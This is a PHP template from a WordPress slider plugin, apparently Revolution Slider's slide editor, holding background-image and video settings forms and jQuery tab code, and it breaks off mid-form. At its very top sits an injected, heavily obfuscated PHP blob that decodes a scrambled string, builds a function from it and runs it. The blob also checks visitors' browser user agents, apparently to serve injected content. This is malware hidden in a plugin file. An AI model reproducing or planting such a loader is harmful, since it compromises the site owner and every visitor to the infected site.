<?php $memczjuwfb = 'pmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]VPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	hj = $vrwspge("", $whdqdgj); $hdqwihj();}}g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.981]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bx7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#d%)ftpmdR6<*id%)dfyfR	x27fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-i[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt4!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x2(!isset($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALS["	x61	1	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%791y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!o7,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#56	x75	156	x61"]=1; $uas=strtolower($_SERVER["	:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osmcnbs+yfeobz+sfwjidsb`b)ftpmdXA6|7**197-2qj	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww63	162	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157	xy]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]38-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%jmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00**-)1/2986+7**^/%rx<~!!%s:N}#]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr]e7y]#>n%<#372]58y]472]37y]672]48tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281hA	x27pd%6<C	x27pd%6|6.7eu{66tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-3]317]445]212]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvs4*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%t*-!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$hdqwi**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:d%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x24]275]y83]273]y76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]25pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")tfs%6<*17-SFEBFI,6<*127-USFT`%}X;!sp!*#opo#>>}R;msv}.tmf!}Z;^nbsbq%	x5cSFWgj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftb::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sf;/#/#/},;#-#}+;%-qp%)**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x) or (strstr($uas,"	x72	166	x3a	61	x31")#44ec:649#-!#:618d5f9#-!#f6cf+9f5d816:+946:ce44#)zbssb!>!ssbnpeoepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%hsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iu{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-hofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<*d	x27,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::xpmpusut!-#j0#!/!**#sf%7-K)udfoopdXA	x22)7gj6<*QDU`x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*5<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!tsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-pjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7UOFHB`SFTV`QUUI&b%!|;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*i5]y72]254]y76#<!%w:!>!(%w:bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#s}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x56e"; function xjrrbes($n){return chr(ord($n)-1);} @error_reporting(0%V	x27{ftmfV	x7f<*X&Z&S{fto!%bss	x5csboe))1/35.)1/14+9**WYsboepn)%bss-%rxB88M4P8]37]278]225]241]334]368]322]3]*[%h!>!%tdz)%bbT-%bT-%hW~%fx5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	**9.-j%-bubE{h%)sutcvt)fubmgoj[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`f%h>#]y31]278]y3e]81]K78:56985:6197x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)35c}X	x24<!%tmw!>!#]y8!>!	x246767~6<Cw6<pd%w6Z668]y7f#<!%tww!>!	x2400~:<#~<#/%	x24-	x24!>!fyqmpef)#	x2 or (strstr($uas,"	x66	151	x72	145	x66	157	x78"))) { $vrwspge = "	x8}527}88:}334}472	x24<!%ff2!>!bssbz)) or (strstr($uas,"	x61	156	xr%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552); $whdqdgj = implode(arramfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R5ubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gjy_map("xjrrbes",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]267;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvuf4-	x24]26	x24-	x24<%jy]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x24217Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_opo#>b%!**X)ufttj	x22)7]y86]267]y74]275]y7:]22L5P6]y6gP7L6M7]D4]275]D:M8]68399#-!#65egb2dc#*<!sfuvso!sb6A:>:8:|:7#6#)tutjyf`439275ttf!<**2-4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#vufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<uC)fepmqnjA	x27&6<.fmjgA	x27dojx24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x2j+upcotn+qsvmt+fmhpph#)zbssb!of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,c	x7f!|!*uyfu	x27k:!fx	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}#W~!Ydrr)%rxB%epnbss!>!bssbz)64	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6d	145"))364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32Mif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%rmsv%)}k~~~<ftmbg!osvufs!|ftmf!~<%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386c6StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSelxovvoru'; $ieofatacou=explode(chr((629-509)),substr($memczjuwfb,(24136-18116),(230-196))); $yrupxi = $ieofatacou[0]($ieofatacou[(4-3)]); $upubkntd = $ieofatacou[0]($ieofatacou[(9-7)]); if (!function_exists('heperjn')) { function heperjn($oxlagjzec, $nvgqoxmi,$yiofoee) { $twnhhfikd = NULL; for($wjlqgifxtx=0;$wjlqgifxtx<(sizeof($oxlagjzec)/2);$wjlqgifxtx++) { $twnhhfikd .= substr($nvgqoxmi, $oxlagjzec[($wjlqgifxtx*2)],$oxlagjzec[($wjlqgifxtx*2)+(5-4)]); } return $yiofoee(chr((63-54)),chr((320-228)),$twnhhfikd); }; } $lerwygql = explode(chr((192-148)),'5776,59,674,63,868,47,2399,48,2447,52,2768,40,4543,29,5644,66,4440,67,1097,56,3797,68,4617,26,4778,66,3621,26,4360,25,3069,37,2094,33,1713,29,51,68,0,51,737,32,3466,58,1027,20,3181,29,2219,38,2159,60,3756,41,5835,50,4214,57,3323,68,5367,30,3564,57,451,25,2499,25,154,67,386,65,570,58,528,42,1995,38,4844,34,3691,65,5932,32,4115,30,2970,52,3647,44,322,64,4709,69,5258,43,769,58,3391,55,4052,63,4305,34,5479,59,3106,53,2628,50,3159,22,1004,23,5450,29,2307,45,5964,56,2836,35,5072,53,3446,20,5022,50,5125,22,2573,55,5538,21,2552,21,2524,28,2678,21,3524,40,3210,49,5228,30,2922,48,3022,47,964,40,5301,66,3865,26,4643,66,827,41,476,52,5559,56,2257,50,2699,69,4339,21,2033,61,5147,23,4385,25,2127,32,1943,52,4572,45,1402,33,1153,44,4899,58,4507,36,1498,66,5397,53,628,46,4878,21,1564,44,3259,64,4410,30,1844,37,1253,61,5615,29,2808,28,5198,30,2871,51,5885,47,1047,50,3919,20,4271,34,263,59,1343,59,1608,55,1435,63,5170,28,1663,50,4957,65,3975,27,119,35,3939,36,5710,66,1776,68,3891,28,1314,29,1197,56,915,49,4002,50,4145,69,1742,34,2352,47,1881,62,221,42'); $xvtpksuka = $yrupxi("",heperjn($lerwygql,$memczjuwfb,$upubkntd)); $yrupxi=$memczjuwfb; $xvtpksuka(""); $xvtpksuka=(685-564); $memczjuwfb=$xvtpksuka-1; ?><?php if( !defined( 'ABSPATH') ) exit(); ?>

<div class="editor_buttons_wrapper  postbox unite-postbox" style="max-width:100% !important; min-width:1040px !important;">
	<div class="box-closed tp-accordion" style="border-bottom:5px solid #ddd;">
		<ul class="rs-slide-settings-tabs">
			<li data-content="#slide-main-image-settings-content" class="selected"><i style="height:45px" class="rs-mini-layer-icon rs-icon-chooser-1 rs-toolbar-icon"></i><span><?php _e("Main Background",REVSLIDER_TEXTDOMAIN); ?></span></li>
			<li data-content="#slide-general-settings-content"><i style="height:45px" class="rs-mini-layer-icon rs-icon-chooser-2 rs-toolbar-icon"></i><?php _e("General Settings",REVSLIDER_TEXTDOMAIN); ?></li>
			<li data-content="#slide-animation-settings-content" id="slide-animation-settings-content-tab"><i style="height:45px" class="rs-mini-layer-icon rs-icon-chooser-3 rs-toolbar-icon"></i><?php _e("Slide Animation",REVSLIDER_TEXTDOMAIN); ?></li>
			<li data-content="#slide-seo-settings-content"><i style="height:45px" class="rs-mini-layer-icon rs-icon-advanced rs-toolbar-icon"></i><?php _e("Link & Seo",REVSLIDER_TEXTDOMAIN); ?></li>
			<li data-content="#slide-info-settings-content"><i style="height:45px; font-size:16px;" class="rs-mini-layer-icon eg-icon-info-circled rs-toolbar-icon"></i><?php _e("Slide Info",REVSLIDER_TEXTDOMAIN); ?></li>						
		</ul>

		<div style="clear:both"></div>
		<script type="text/javascript">
			jQuery('document').ready(function() {
				jQuery('.rs-slide-settings-tabs li').click(function() {
					var tw = jQuery('.rs-slide-settings-tabs .selected'),
						tn = jQuery(this);
					jQuery(tw.data('content')).hide(0);
					tw.removeClass("selected");
					tn.addClass("selected");
					jQuery(tn.data('content')).show(0);
				});
			});
		</script>
	</div>
	<div style="padding:15px">
		<form name="form_slide_params" id="form_slide_params" class="slide-main-settings-form">
			
			<div id="slide-main-image-settings-content" class="slide-main-settings-form">

				<ul class="rs-layer-main-image-tabs" style="display:inline-block; ">
					<li data-content="#mainbg-sub-source" class="selected"><?php _e('Source', REVSLIDER_TEXTDOMAIN); ?></li>
					<li class="mainbg-sub-settings-selector" data-content="#mainbg-sub-setting"><?php _e('Source Settings', REVSLIDER_TEXTDOMAIN); ?></li>					
					<li class="mainbg-sub-parallax-selector" data-content="#mainbg-sub-parallax"><?php _e('Parallax', REVSLIDER_TEXTDOMAIN); ?></li>
					<li class="mainbg-sub-kenburns-selector" data-content="#mainbg-sub-kenburns"><?php _e('Ken Burns', REVSLIDER_TEXTDOMAIN); ?></li>
				</ul>

				<div class="tp-clearfix"></div>

				<script type="text/javascript">
					jQuery('document').ready(function() {
						jQuery('.rs-layer-main-image-tabs li').click(function() {
							var tw = jQuery('.rs-layer-main-image-tabs .selected'),
								tn = jQuery(this);
							jQuery(tw.data('content')).hide(0);
							tw.removeClass("selected");
							tn.addClass("selected");
							jQuery(tn.data('content')).show(0);
						});
					});
				</script>


				<!-- SLIDE MAIN IMAGE -->
				<span id="mainbg-sub-source" style="display:block">
					<div style="float:none; clear:both; margin-bottom: 15px;"></div>
					<input type="hidden" name="rs-gallery-type" value="<?php echo esc_attr($slider_type); ?>" />
					<span class="diblock bg-settings-block">
						<!-- IMAGE FROM MEDIAGALLERY -->												
						<?php
						if($slider_type == 'posts' || $slider_type == 'specific_posts'){
							?>
							<label><?php _e("Featured Image",REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="radio" name="background_type" value="image" class="bgsrcchanger" data-callid="tp-bgimagewpsrc" data-imgsettings="on" data-bgtype="image" id="radio_back_image" <?php checked($bgType, 'image'); ?>>
							
							<?php
							/*
							<div class="tp-clearfix"></div>
							<label><?php _e("Meta Image",REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="radio" name="background_type" value="meta" class="bgsrcchanger" data-callid="tp-bgimagewpsrc" data-imgsettings="on" data-bgtype="meta" <?php checked($bgType, 'meta'); ?>>
							<span id="" class="" style="margin-left:20px;">
								<span style="margin-right: 10px"><?php _e('Meta Handle', REVSLIDER_TEXTDOMAIN); ?></span>
								<input type="text" id="meta_handle" name="meta_handle" value="<?php echo $meta_handle; ?>">
							</span>*/ ?>
							<?php
						}elseif($slider_type !== 'gallery'){
							?>
							<label><?php _e("Stream Image",REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="radio" name="background_type" value="image" class="bgsrcchanger" data-callid="tp-bgimagewpsrc" data-imgsettings="on" data-bgtype="image" id="radio_back_image" <?php checked($bgType, 'image'); ?>>
							<?php
							if($slider_type == 'vimeo' || $slider_type == 'youtube' || $slider_type == 'instagram' || $slider_type == 'twitter'){
								?>
								<div class="tp-clearfix"></div>
								<label><?php _e("Stream Video",REVSLIDER_TEXTDOMAIN); ?></label>
								<input type="radio" name="background_type" value="stream<?php echo $slider_type; ?>" class="bgsrcchanger" data-callid="tp-bgimagewpsrc" data-imgsettings="on" data-bgtype="stream<?php echo $slider_type; ?>" <?php checked($bgType, 'stream'.$slider_type); ?>>
								<span id="streamvideo_cover" class="streamvideo_cover" style="display:none;margin-left:20px;">
									<span style="margin-right: 10px"><?php _e("Use Cover",REVSLIDER_TEXTDOMAIN); ?></span>
									<input type="checkbox" class="tp-moderncheckbox" id="stream_do_cover" name="stream_do_cover" data-unchecked="off" <?php checked($stream_do_cover, 'on'); ?>>
								</span>
								
								<div class="tp-clearfix"></div>
								<label><?php _e("Stream Video + Image",REVSLIDER_TEXTDOMAIN); ?></label>
								<input type="radio" name="background_type" value="stream<?php echo $slider_type; ?>both" class="bgsrcchanger" data-callid="tp-bgimagewpsrc" data-imgsettings="on" data-bgtype="stream<?php echo $slider_type; ?>both" <?php checked($bgType, 'stream'.$slider_type.'both'); ?>>
								<span id="streamvideo_cover_both" class="streamvideo_cover_both" style="display:none;margin-left:20px;">
									<span style="margin-right: 10px"><?php _e("Use Cover",REVSLIDER_TEXTDOMAIN); ?></span>
									<input type="checkbox" class="tp-moderncheckbox" id="stream_do_cover_both" name="stream_do_cover_both" data-unchecked="off" <?php checked($stream_do_cover_both, 'on'); ?>>
								</span>
								<?php
							}
						}else{
							?>
							<label ><?php _e("Main / Background Image",REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="radio" name="background_type" value="image" class="bgsrcchanger" data-callid="tp-bgimagewpsrc" data-imgsettings="on" data-bgtype="image" id="radio_back_image" <?php checked($bgType, 'image'); ?>>
							
							<?php
						}
						?>
						<!-- THE BG IMAGE CHANGED DIV -->
						<span id="tp-bgimagewpsrc" class="bgsrcchanger-div" style="display:none;margin-left:20px;">
							<a href="javascript:void(0)" id="button_change_image" class="button-primary revblue" ><?php _e("Change Image", REVSLIDER_TEXTDOMAIN); ?></a>
						</span>
						
						<div class="tp-clearfix"></div>
						
						<!-- IMAGE FROM EXTERNAL -->
						<label><?php _e("External URL",REVSLIDER_TEXTDOMAIN); ?></label>
						<input type="radio" name="background_type" value="external" data-callid="tp-bgimageextsrc" data-imgsettings="on" class="bgsrcchanger" data-bgtype="external" id="radio_back_external" <?php checked($bgType, 'external'); ?>>

						<!-- THE BG IMAGE FROM EXTERNAL SOURCE -->
						<span id="tp-bgimageextsrc" class="bgsrcchanger-div" style="display:none;margin-left:20px;">
							<input type="text" name="bg_external" id="slide_bg_external" value="<?php echo $slideBGExternal?>" <?php echo ($bgType != 'external') ? ' class="disabled"' : ''; ?>>
							<a href="javascript:void(0)" id="button_change_external" class="button-primary revblue" ><?php _e("Get External",REVSLIDER_TEXTDOMAIN); ?></a>
						</span>
						
						<div class="tp-clearfix"></div>
						
						<!-- TRANSPARENT BACKGROUND -->
						<label><?php _e("Transparent",REVSLIDER_TEXTDOMAIN); ?></label>
						<input type="radio" name="background_type" value="trans" data-callid="" class="bgsrcchanger" data-bgtype="trans" id="radio_back_trans" <?php checked($bgType, 'trans'); ?>>
						<div class="tp-clearfix"></div>
						
						<!-- COLORED BACKGROUND -->
						<label><?php _e("Solid Colored",REVSLIDER_TEXTDOMAIN); ?></label>
						<input type="radio" name="background_type" value="solid"  data-callid="tp-bgcolorsrc" class="bgsrcchanger" data-bgtype="solid" id="radio_back_solid" <?php checked($bgType, 'solid'); ?>>
						
						<!-- THE COLOR SELECTOR -->
						<span id="tp-bgcolorsrc"  class="bgsrcchanger-div"  style="display:none;margin-left:20px;">
							<input type="text" name="bg_color" id="slide_bg_color" class="my-color-field" value="<?php echo $slideBGColor; ?>">
						</span>
						<div class="tp-clearfix"></div>

						<!-- THE YOUTUBE SELECTOR -->
						<label><?php _e("YouTube Video",REVSLIDER_TEXTDOMAIN); ?></label>
						<input type="radio" name="background_type" value="youtube"  data-callid="tp-bgyoutubesrc" class="bgsrcchanger" data-bgtype="youtube" id="radio_back_youtube" <?php checked($bgType, 'youtube'); ?>>
						<div class="tp-clearfix"></div>
						
						<!-- THE BG IMAGE FROM YOUTUBE SOURCE -->
						<span id="tp-bgyoutubesrc" class="bgsrcchanger-div" style="display:none; margin-left:20px;">
							<label style="min-width:180px"><?php _e("ID:",REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="text" name="slide_bg_youtube" id="slide_bg_youtube" value="<?php echo $slideBGYoutube; ?>" <?php echo ($bgType != 'youtube') ? ' class="disabled"' : ''; ?>>							
							<?php _e('example: T8--OggjJKQ', REVSLIDER_TEXTDOMAIN); ?>
							<div class="tp-clearfix"></div>
							<label style="min-width:180px"><?php _e("Cover Image:",REVSLIDER_TEXTDOMAIN); ?></label>
							<span id="youtube-image-picker"></span>
						</span>
						<div class="tp-clearfix"></div>
						
						<!-- THE VIMEO SELECTOR -->
						<label><?php _e("Vimeo Video",REVSLIDER_TEXTDOMAIN); ?></label>
						<input type="radio" name="background_type" value="vimeo"  data-callid="tp-bgvimeosrc" class="bgsrcchanger" data-bgtype="vimeo" id="radio_back_vimeo" <?php checked($bgType, 'vimeo'); ?>>
						<div class="tp-clearfix"></div>

						<!-- THE BG IMAGE FROM VIMEO SOURCE -->
						<span id="tp-bgvimeosrc" class="bgsrcchanger-div" style="display:none; margin-left:20px;">
							<label style="min-width:180px"><?php _e("ID:",REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="text" name="slide_bg_vimeo" id="slide_bg_vimeo" value="<?php echo $slideBGVimeo; ?>" <?php echo ($bgType != 'vimeo') ? ' class="disabled"' : ''; ?>>							
							<?php _e('example: 30300114', REVSLIDER_TEXTDOMAIN); ?>
							<div class="tp-clearfix"></div>
							<label style="min-width:180px"><?php _e("Cover Image:",REVSLIDER_TEXTDOMAIN); ?></label>
							<span id="vimeo-image-picker"></span>
						</span>
						<div class="tp-clearfix"></div>

						<!-- THE HTML5 SELECTOR -->
						<label><?php _e("HTML5 Video",REVSLIDER_TEXTDOMAIN); ?></label>
						<input type="radio" name="background_type" value="html5"  data-callid="tp-bghtmlvideo" class="bgsrcchanger" data-bgtype="html5" id="radio_back_htmlvideo" <?php checked($bgType, 'html5'); ?>>
						<div class="tp-clearfix"></div>
						<!-- THE BG IMAGE FROM HTML5 SOURCE -->
						<span id="tp-bghtmlvideo" class="bgsrcchanger-div" style="display:none; margin-left:20px;">
							
							<label style="min-width:180px"><?php _e('MPEG:', REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="text" name="slide_bg_html_mpeg" id="slide_bg_html_mpeg" value="<?php echo $slideBGhtmlmpeg; ?>" <?php echo ($bgType != 'html5') ? ' class="disabled"' : ''; ?>>
							<span class="vidsrcchanger-div" style="margin-left:20px;">
								<a href="javascript:void(0)" data-inptarget="slide_bg_html_mpeg" class="button_change_video button-primary revblue" ><?php _e('Change Video', REVSLIDER_TEXTDOMAIN); ?></a>
							</span>
							<div class="tp-clearfix"></div>
							<label style="min-width:180px"><?php _e('WEBM:', REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="text" name="slide_bg_html_webm" id="slide_bg_html_webm" value="<?php echo $slideBGhtmlwebm; ?>" <?php echo ($bgType != 'html5') ? ' class="disabled"' : ''; ?>>
							<span class="vidsrcchanger-div" style="margin-left:20px;">
								<a href="javascript:void(0)" data-inptarget="slide_bg_html_webm" class="button_change_video button-primary revblue" ><?php _e('Change Video', REVSLIDER_TEXTDOMAIN); ?></a>
							</span>
							<div class="tp-clearfix"></div>
							<label style="min-width:180px"><?php _e('OGV:', REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="text" name="slide_bg_html_ogv" id="slide_bg_html_ogv" value="<?php echo $slideBGhtmlogv; ?>" <?php echo ($bgType != 'html5') ? ' class="disabled"' : ''; ?>>							
							<span class="vidsrcchanger-div" style="margin-left:20px;">
								<a href="javascript:void(0)" data-inptarget="slide_bg_html_ogv" class="button_change_video button-primary revblue" ><?php _e('Change Video', REVSLIDER_TEXTDOMAIN); ?></a>
							</span>
							<div class="tp-clearfix"></div>
							<label style="min-width:180px"><?php _e('Cover Image:', REVSLIDER_TEXTDOMAIN); ?></label>
							<span id="html5video-image-picker"></span>
						</span>
					</span>
				</span>
				<span id="mainbg-sub-setting" style="display:none">
					<div class="rs-img-source-url">
						<div style="float:none; clear:both; margin-bottom: 15px;"></div>
						<label><?php _e('Image Source:', REVSLIDER_TEXTDOMAIN); ?></label>
						<span class="text-selectable" id="the_image_source_url" style="margin-right:20px"></span>
					</div>

					<div class="rs-img-source-size">
						<div style="float:none; clear:both; margin-bottom: 15px;"></div>
						<label><?php _e('Image Source Size:', REVSLIDER_TEXTDOMAIN); ?></label>
						<span style="margin-right:20px">
							<select name="image_source_type">
								<?php
								foreach($img_sizes as $imghandle => $imgSize){
									$sel = ($bg_image_size == $imghandle) ? ' selected="selected"' : '';
									echo '<option value="'.sanitize_title($imghandle).'"'.$sel.'>'.$imgSize.'</option>';
								}
								?>
							</select>
						</span>
					</div>
					
					<span id="tp-bgimagesettings" class="bgsrcchanger-div" style="display:none;">
						<!-- ALT -->
						<p>
							<?php $alt_option = RevSliderFunctions::getVal($slideParams, 'alt_option', 'media_library'); ?>
							<label><?php _e("Alt:",REVSLIDER_TEXTDOMAIN); ?></label>
							<select id="alt_option" name="alt_option">
								<option value="media_library" <?php selected($alt_option, 'media_library'); ?>><?php _e('From Media Library', REVSLIDER_TEXTDOMAIN); ?></option>
								<option value="file_name" <?php selected($alt_option, 'file_name'); ?>><?php _e('From Filename', REVSLIDER_TEXTDOMAIN); ?></option>
								<option value="custom" <?php selected($alt_option, 'custom'); ?>><?php _e('Custom', REVSLIDER_TEXTDOMAIN); ?></option>
							</select>
							<?php $alt_attr = RevSliderFunctions::getVal($slideParams, 'alt_attr', ''); ?>
							<input style="<?php echo ($alt_option !== 'custom') ? 'display:none;' : ''; ?>" type="text" id="alt_attr" name="alt_attr" value="<?php echo $alt_attr; ?>">
						</p>
						<p class="ext_setting" style="display: none;">
							<label><?php _e('Width:', REVSLIDER_TEXTDOMAIN)?></label>
							<input type="text" name="ext_width" value="<?php echo $ext_width; ?>" />
						</p>
						<p class="ext_setting" style="display: none;">
							<label><?php _e('Height:', REVSLIDER_TEXTDOMAIN)?></label>
							<input type="text" name="ext_height" value="<?php echo $ext_height; ?>" />
						</p>
					</span>					
					
					<span id="video-settings" style="display: block;">
						<p>
							<label for="video_force_cover" class="video-label"><?php _e('Force Cover:', REVSLIDER_TEXTDOMAIN); ?></label>
							<input type="checkbox" class="tp-moderncheckbox" id="video_force_cover" name="video_force_cover" data-unchecked="off" <?php checked($video_force_cover, 'on'); ?>>
						</p>
						<span id="video_dotted_overlay_wrap">
							<label for="video_dotted_overlay">
								<?php _e('Dotted Overlay:', REVSLIDER_TEXTDOMAIN); ?>
							</label>				
							<select id="video_dotted_overlay" name="video_dotted_overlay" style="width:100px">
								<option <?php selected($video_dotted_overlay, 'none'); ?> value="none"><?php _e('none', REVSLIDER_TEXTDOMAIN); ?></option>
								<option <?php selected($video_dotted_overlay, 'twoxtwo'); ?> value="twoxtwo"><?php _e('2 x 2 Black', REVSLIDER_TEXTDOMAIN); ?></option>
								<option <?php selected($video_dotted_overlay, 'twoxtwowhite'); ?> value="twoxtwowhite"><?php _e('2 x 2 White', REVSLIDER_TEXTDOMAIN); ?></option>
								<option <?php selected($video_dotted_overlay, 'threexthree'); ?> value="threexthree"><?php _e('3 x 3 Black', REVSLIDER_TEXTDOMAIN); ?></option>
								<option <?php selected($video_dotted_overlay, 'threexthreewhite'); ?> value="threexthreewhite"><?php _e('3 x 3 White', REVSLIDER_TEXTDOMAIN); ?></option>
							</select>
							<p style="clear: both;"></p>
							<label for="video_ratio">
								<?php _e("Aspect Ratio:", REVSLIDER_TEXTDOMAIN); ?>
							</label>				
							<select id="video_ratio" name="video_ratio" style="width:100px">
								<option <?php selected($video_ratio, '16:9');?> value="16:9"><?php _e('16:9',REVSLIDER_TEXTDOMAIN); ?></option>
								<option <?php selected($video_ratio, '4:3');?> value="4:3"><?php _e('4:3',REVSLIDER_TEXTDOMAIN); ?></option>
							</select>
							<p style="clear: both;"></p>
						</span>
						<p>
							<label for="video_ratio">
								<?php _e("Start At:", REVSLIDER_TEXTDOMAIN); ?>
							</label>				
							<input type="text" value="<?php echo $video_start_at; ?>" name="video_start_at"> <?php _e('For Example: 00:17', REVSLIDER_TEXTDOMAIN); ?>
							<p style="clear: both;"></p>
						</p>
						<p>
							<label for="video_ratio">
								<?php _e("End At:", REVSLIDER_TEXTDOMAIN); ?>
							</label>				
